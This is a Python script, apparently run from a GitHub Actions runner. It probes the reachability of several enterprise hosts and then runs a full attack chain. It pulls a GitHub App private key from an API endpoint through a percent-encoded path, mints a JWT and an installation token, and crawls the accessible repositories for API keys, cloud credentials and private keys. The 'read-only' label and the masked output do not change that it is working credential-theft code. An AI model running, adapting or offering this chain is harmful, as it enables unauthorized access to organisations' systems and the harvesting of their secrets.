#!/usr/bin/env python3
"""11994: GHES / GitLab-Enterprise reachability from a GitHub-hosted runner + read-only App47 JWT/installation-token flow.

Read-only. Never prints PEM / JWT / installation token. PEM held only in RUNNER_TEMP, deleted in finally.
"""
import base64, json, os, re, socket, ssl, sys, tempfile, time, urllib.request, urllib.error, urllib.parse, hashlib

GHES = "github-enterprise.sonarqube.com"
GITLAB = "gitlab-enterprise.sonarqube.com"
AUDIT = "audit.sonarqube.com"
PEACH = "peach.aws-prd.sonarsource.com"
CTRL = "example.com"
SONAR_API = "api.sonarcloud.io"
OPEN = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def log(*a):
    print(*a, flush=True)


def dns(name):
    r = {"name": name}
    try:
        t0 = time.time()
        infos = socket.getaddrinfo(name, 443, proto=socket.IPPROTO_TCP)
        r.update(ok=True, ms=round((time.time() - t0) * 1000), ips=sorted({i[4][0] for i in infos}))
    except Exception as e:
        r.update(ok=False, error="%s: %s" % (type(e).__name__, e))
    return r


def tls(name, port=443, timeout=10):
    r = {"name": name, "port": port}
    ctx = ssl.create_default_context()
    t0 = time.time()
    try:
        with socket.create_connection((name, port), timeout=timeout) as raw:
            r["tcp_ms"] = round((time.time() - t0) * 1000)
            t1 = time.time()
            with ctx.wrap_socket(raw, server_hostname=name) as ss:
                r.update(tls_ok=True, tls_ms=round((time.time() - t1) * 1000), tls_version=ss.version())
                cert = ss.getpeercert() or {}
                r["cert_subject"] = dict(x[0] for x in cert.get("subject", ()))
                r["cert_issuer"] = dict(x[0] for x in cert.get("issuer", ()))
                r["notAfter"] = cert.get("notAfter")
    except Exception as e:
        r.update(tls_ok=False, error="%s: %s" % (type(e).__name__, e))
    return r


def http(url, timeout=15, headers=None, method="GET", data=None, maxbody=3000):
    h = {"User-Agent": "probe-11994/1.0", "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = {"url": url, "method": method}
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with OPEN.open(req, timeout=timeout) as resp:
            body = resp.read(maxbody)
            r.update(status=resp.status, ms=round((time.time() - t0) * 1000),
                     content_type=resp.headers.get("Content-Type"), server=resp.headers.get("Server"),
                     len=len(body), body=body.decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        body = e.read(maxbody)
        r.update(status=e.code, ms=round((time.time() - t0) * 1000),
                 content_type=e.headers.get("Content-Type"), server=e.headers.get("Server"),
                 len=len(body), body=body.decode("utf-8", "replace"))
    except Exception as e:
        r.update(status=None, ms=round((time.time() - t0) * 1000), error="%s: %s" % (type(e).__name__, e))
    return r


def json_of(r):
    if not r.get("body"):
        return None
    try:
        return json.loads(r["body"])
    except Exception:
        return None


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def make_jwt(pem_bytes, app_id="47", ttl=540):
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    key = serialization.load_pem_private_key(pem_bytes, password=None)
    now = int(time.time())
    signing_input = (b64u(json.dumps({"alg": "RS256", "typ": "JWT"}, separators=(",", ":")).encode()) + "." +
                     b64u(json.dumps({"iat": now - 60, "exp": now + ttl, "iss": app_id}, separators=(",", ":")).encode())).encode()
    sig = key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    return signing_input.decode() + "." + b64u(sig)


def fetch_pem():
    u = "https://%s/github-configurations/%%77ebhook-secret?tenantSlug=%s&applicationId=47&installationId=61" % (SONAR_API, GHES)
    r = http(u, timeout=25, headers={"Accept": "application/json"}, maxbody=20000)
    d = json_of(r)
    if not d:
        return None, "endpoint status=%s body=%s" % (r.get("status"), (r.get("body") or r.get("error"))[:200])
    pk = d.get("privateKey") or ""
    if "PRIVATE KEY-----" in pk:
        return pk.encode(), "fetched len=%d sha256_prefix=%s" % (len(pk), hashlib.sha256(pk.encode()).hexdigest()[:8])
    return None, "no privateKey (status=%s keys=%s)" % (r.get("status"), list(d)[:10])


def gh(url, jwt, method="GET", data=None, maxbody=8000):
    return http(url, timeout=25, method=method, data=data, maxbody=maxbody,
                headers={"Authorization": "Bearer " + jwt,
                         "Accept": "application/vnd.github+json",
                         "X-GitHub-Api-Version": "2022-11-28",
                         "Content-Type": "application/json" if data else "text/plain"})


HIGH = re.compile(r"(\.github/workflows/|\.tf$|\.tfvars$|tfstate|ansible|/sops/|\.enc\.(yaml|yml|json)$|"
                  r"(^|/)dockerfile|docker-compose|(^|/)config/[^/]+\.(ya?ml|json|toml|properties)$|"
                  r"(^|/)scripts/[^/]+\.sh$|(^|/)\.env|vault|kms|secret|deploy)", re.I)
PRIO = re.compile(r"(infra|terraform|sops|ansible|deploy|ci-|actions|secrets?|vault|kms|config|platform|ops)", re.I)
PATTERNS = {
    "anthropic": r"sk-ant-[A-Za-z0-9_\-]{16,}",
    "openai": r"sk-proj-[A-Za-z0-9_\-]{16,}|sk-[A-Za-z0-9]{32,}",
    "google": r"AIza[0-9A-Za-z_\-]{30,}",
    "xai": r"xai-[A-Za-z0-9]{16,}",
    "portkey": r"pt-[A-Za-z0-9_\-]{16,}",
    "aws_ak": r"(AKIA|ASIA)[0-9A-Z]{16}",
    "gh_token": r"(ghp|ghs|ghu)_[A-Za-z0-9]{30,}",
    "sq_token": r"(sqco_|squ_|sqp_)[A-Za-z0-9]{16,}",
    "privkey": r"BEGIN (RSA |OPENSSH |PGP |EC |ENCRYPTED )?PRIVATE KEY",
    "kmsarn": r"arn:aws:kms:[a-z0-9\-]+:\d{12}:key/[0-9a-f\-]+",
}
SMNAME = re.compile(r"(?:Secrets Manager|secretsmanager:|ssm:|secret/)[\w./\-]{4,80}")


def mask(s):
    s = s.strip()
    return (s[:4] + "****" + s[-4:]) if len(s) >= 12 else "****"


def scan_repos(inst_token, budget_files=150, per_repo=20):
    res = {"repos_total": None, "repos_scanned": 0, "files_read": 0, "hits": [], "errors": [], "repo_names_sample": []}
    hdr = {"Authorization": "Bearer " + inst_token, "Accept": "application/vnd.github+json",
           "X-GitHub-Api-Version": "2022-11-28"}
    base = "https://%s/api/v3" % GHES
    r = http(base + "/installation/repositories?per_page=100&page=1", timeout=30, headers=hdr, maxbody=2000000)
    d = json_of(r)
    if not d:
        res["errors"].append("installation/repositories status=%s body=%s" % (r.get("status"), (r.get("body") or r.get("error"))[:200]))
        return res
    res["repos_total"] = d.get("total_count")
    repos = d.get("repositories") or []
    ordered = sorted(repos, key=lambda x: (0 if PRIO.search(x.get("name", "")) else 1, x.get("full_name", "")))
    res["repo_names_sample"] = [x.get("full_name") for x in ordered[:80]]
    for repo in ordered:
        if res["files_read"] >= budget_files:
            break
        full = repo.get("full_name")
        br = repo.get("default_branch") or "main"
        tr = http("%s/repos/%s/git/trees/%s?recursive=1" % (base, full, br), timeout=30, headers=hdr, maxbody=8000000)
        t = json_of(tr)
        if not t:
            res["errors"].append("tree %s status=%s" % (full, tr.get("status")))
            continue
        paths = [e["path"] for e in (t.get("tree") or []) if e.get("type") == "blob" and HIGH.search(e["path"])]
        res["repos_scanned"] += 1
        for p in paths[:per_repo]:
            if res["files_read"] >= budget_files:
                break
            cr = http("%s/repos/%s/contents/%s" % (base, full, urllib.parse.quote(p)), timeout=25,
                      headers={**hdr, "Accept": "application/vnd.github.raw"}, maxbody=400000)
            res["files_read"] += 1
            if cr.get("status") != 200:
                continue
            content = cr.get("body", "")
            for k, pat in PATTERNS.items():
                for m in re.finditer(pat, content):
                    res["hits"].append({"repo": full, "path": p, "kind": k, "value_masked": mask(m.group(0))})
            for m in SMNAME.finditer(content):
                res["hits"].append({"repo": full, "path": p, "kind": "sm_name", "value_masked": m.group(0)[:60]})
    return res


def main():
    ph = {"ts": int(time.time()), "runner": {k: os.environ.get(k) for k in ("RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH", "GITHUB_RUN_ID")}}
    for u in ("https://api.ipify.org?format=json", "https://ifconfig.me/all.json"):
        r = http(u, timeout=10, maxbody=500)
        ph.setdefault("egress", []).append({u: r.get("body", r.get("error"))})
        if r.get("status") == 200:
            break
    log("egress:", ph["egress"][-1])

    ph["dns"] = {h: dns(h) for h in (GHES, GITLAB, AUDIT, PEACH, CTRL, SONAR_API)}
    log("DNS:", json.dumps({k: v.get("ips", v.get("error")) for k, v in ph["dns"].items()}))

    ph["tls"] = {h: tls(h) for h in (GHES, GITLAB, AUDIT, PEACH, CTRL)}
    log("TLS:", json.dumps({k: [v.get("tls_ok"), v.get("cert_subject", {}).get("commonName"), v.get("error")] for k, v in ph["tls"].items()}))

    paths = {
        GHES: ["/", "/api/v3/zen", "/api/v3/meta", "/api/v3/app"],
        GITLAB: ["/", "/api/v4/version", "/-/readiness"],
        AUDIT: ["/", "/api/system/status", "/api/server/version"],
        PEACH: ["/", "/api/system/status"],
        CTRL: ["/"],
    }
    ph["http"] = {}
    for h, ps in paths.items():
        ph["http"][h] = [http("https://%s%s" % (h, p), timeout=12, maxbody=2000) for p in ps]
        log("HTTP", h, [(x["url"].split(h)[1] or "/", x.get("status"), x.get("ms"), (x.get("error") or "")[:60]) for x in ph["http"][h]])

    def reachable(host):
        return any(x.get("status") is not None for x in ph["http"].get(host, []))

    ph["verdict"] = {"ghes_reachable": reachable(GHES), "gitlab_reachable": reachable(GITLAB),
                     "audit_reachable": reachable(AUDIT), "peach_reachable": reachable(PEACH),
                     "control_reachable": reachable(CTRL)}

    ph["app47"] = {"attempted": False}
    if ph["verdict"]["ghes_reachable"]:
        ph["app47"]["attempted"] = True
        pem, how = fetch_pem()
        ph["app47"]["pem"] = how
        log("app47 pem:", how)
        if pem:
            pemfile = os.path.join(os.environ.get("RUNNER_TEMP", tempfile.gettempdir()), "app47_%d.pem" % os.getpid())
            try:
                with open(pemfile, "wb") as f:
                    f.write(pem)
                os.chmod(pemfile, 0o600)
                jwt = make_jwt(open(pemfile, "rb").read())
                ph["app47"]["jwt_minted"] = True
                r = gh("https://%s/api/v3/app/installations" % GHES, jwt, maxbody=300000)
                d = json_of(r)
                ph["app47"]["installations"] = {"status": r.get("status"),
                                                "ids": [i.get("id") for i in d] if isinstance(d, list) else None,
                                                "body": None if d else (r.get("body") or r.get("error") or "")[:400]}
                log("app/installations:", r.get("status"), (r.get("body") or r.get("error"))[:200])
                r2 = gh("https://%s/api/v3/app/installations/61/access_tokens" % GHES, jwt, method="POST", data=b"{}", maxbody=20000)
                j2 = json_of(r2)
                tok = (j2 or {}).get("token")
                ph["app47"]["access_token"] = {"status": r2.get("status"), "minted": bool(tok)}
                log("access_tokens:", r2.get("status"), "minted=", bool(tok))
                if tok:
                    ph["app47"]["repos"] = scan_repos(tok)
                    log("repos:", json.dumps({k: ph["app47"]["repos"][k] for k in ("repos_total", "repos_scanned", "files_read")}))
                    log("hits:", len(ph["app47"]["repos"]["hits"]))
            finally:
                try:
                    os.unlink(pemfile)
                except Exception:
                    pass

    fn = os.environ.get("OUTFILE", "result.json")
    with open(fn, "w") as f:
        json.dump(ph, f, indent=1)
    log("===RESULT_JSON_BEGIN===")
    log(json.dumps(ph, indent=1))
    log("===RESULT_JSON_END===")


if __name__ == "__main__":
    main()
